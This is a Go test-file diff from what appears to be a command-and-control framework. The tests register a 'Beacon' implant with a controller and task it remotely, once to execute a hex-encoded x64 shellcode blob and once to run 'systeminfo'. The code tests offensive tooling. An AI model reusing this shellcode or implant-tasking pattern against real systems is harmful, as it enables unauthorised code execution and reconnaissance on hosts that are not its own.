@@ -8,12 +8,60 @@ import (
 
 	"github.com/stretchr/testify/require"
 
+	"project/internal/bootstrap"
 	"project/internal/messages"
 	"project/internal/testsuite"
+
+	"project/beacon"
 )
 
 func TestExecuteShellCode(t *testing.T) {
 	iNode := generateInitialNodeAndTrust(t)
+	iNodeGUID := iNode.GUID()
+
+	// create bootstrap
+	iListener, err := iNode.GetListener(InitialNodeListenerTag)
+	require.NoError(t, err)
+	iAddr := iListener.Addr()
+	bListener := &bootstrap.Listener{
+		Mode:    iListener.Mode(),
+		Network: iAddr.Network(),
+		Address: iAddr.String(),
+	}
+	boot, key := generateBootstrap(t, bListener)
+	ctrl.Test.CreateBeaconRegisterRequestChannel()
+
+	// create and run Beacon
+	beaconCfg := generateBeaconConfig(t, "Beacon")
+	beaconCfg.Register.FirstBoot = boot
+	beaconCfg.Register.FirstKey = key
+	Beacon, err := beacon.New(beaconCfg)
+	require.NoError(t, err)
+	go func() {
+		err := Beacon.Main()
+		require.NoError(t, err)
+	}()
+
+	// read Beacon register request
+	select {
+	case brr := <-ctrl.Test.BeaconRegisterRequest:
+		err = ctrl.AcceptRegisterBeacon(brr)
+		require.NoError(t, err)
+	case <-time.After(3 * time.Second):
+		t.Fatal("read Ctrl.Test.BeaconRegisterRequest timeout")
+	}
+	timer := time.AfterFunc(10*time.Second, func() {
+		t.Fatal("beacon register timeout")
+	})
+	Beacon.Wait()
+	timer.Stop()
+
+	// connect Initial Node
+	err = Beacon.Synchronize(context.Background(), iNodeGUID, bListener)
+	require.NoError(t, err)
+
+	beaconGUID := Beacon.GUID()
+	ctrl.EnableInteractiveMode(beaconGUID)
 
 	scHex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b52184" +
 		"88b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c" +
@@ -30,27 +78,87 @@ func TestExecuteShellCode(t *testing.T) {
 		Method:    "vp",
 		ShellCode: scBytes,
 	}
-	err := ctrl.SendToNode(context.Background(), iNode.GUID(), messages.CMDBExecuteShellCode, &es)
+	err = ctrl.SendToBeacon(context.Background(), beaconGUID, messages.CMDBExecuteShellCode, &es)
 	require.NoError(t, err)
 
-	time.Sleep(10 * time.Second)
+	time.Sleep(5 * time.Second)
+
 	// clean
 	iNode.Exit(nil)
 	testsuite.IsDestroyed(t, iNode)
+	Beacon.Exit(nil)
+	testsuite.IsDestroyed(t, Beacon)
+
+	err = ctrl.DeleteBeaconUnscoped(beaconGUID)
+	require.NoError(t, err)
+	err = ctrl.DeleteNodeUnscoped(iNodeGUID)
+	require.NoError(t, err)
 }
 
 func TestShell(t *testing.T) {
 	iNode := generateInitialNodeAndTrust(t)
+	iNodeGUID := iNode.GUID()
+
+	// create bootstrap
+	iListener, err := iNode.GetListener(InitialNodeListenerTag)
+	require.NoError(t, err)
+	iAddr := iListener.Addr()
+	bListener := &bootstrap.Listener{
+		Mode:    iListener.Mode(),
+		Network: iAddr.Network(),
+		Address: iAddr.String(),
+	}
+	boot, key := generateBootstrap(t, bListener)
+	ctrl.Test.CreateBeaconRegisterRequestChannel()
+
+	// create and run Beacon
+	beaconCfg := generateBeaconConfig(t, "Beacon")
+	beaconCfg.Register.FirstBoot = boot
+	beaconCfg.Register.FirstKey = key
+	Beacon, err := beacon.New(beaconCfg)
+	require.NoError(t, err)
+	go func() {
+		err := Beacon.Main()
+		require.NoError(t, err)
+	}()
+
+	// read Beacon register request
+	select {
+	case brr := <-ctrl.Test.BeaconRegisterRequest:
+		err = ctrl.AcceptRegisterBeacon(brr)
+		require.NoError(t, err)
+	case <-time.After(3 * time.Second):
+		t.Fatal("read Ctrl.Test.BeaconRegisterRequest timeout")
+	}
+	timer := time.AfterFunc(10*time.Second, func() {
+		t.Fatal("beacon register timeout")
+	})
+	Beacon.Wait()
+	timer.Stop()
+
+	// connect Initial Node
+	err = Beacon.Synchronize(context.Background(), iNodeGUID, bListener)
+	require.NoError(t, err)
+
+	beaconGUID := Beacon.GUID()
+	ctrl.EnableInteractiveMode(beaconGUID)
 
 	shell := messages.Shell{
 		Command: "systeminfo",
 	}
-	err := ctrl.SendToNode(context.Background(), iNode.GUID(), messages.CMDBShell, &shell)
+	err = ctrl.SendToBeacon(context.Background(), beaconGUID, messages.CMDBShell, &shell)
 	require.NoError(t, err)
 
-	time.Sleep(10 * time.Second)
+	time.Sleep(5 * time.Second)
 
 	// clean
 	iNode.Exit(nil)
 	testsuite.IsDestroyed(t, iNode)
+	Beacon.Exit(nil)
+	testsuite.IsDestroyed(t, Beacon)
+
+	err = ctrl.DeleteBeaconUnscoped(beaconGUID)
+	require.NoError(t, err)
+	err = ctrl.DeleteNodeUnscoped(iNodeGUID)
+	require.NoError(t, err)
 }
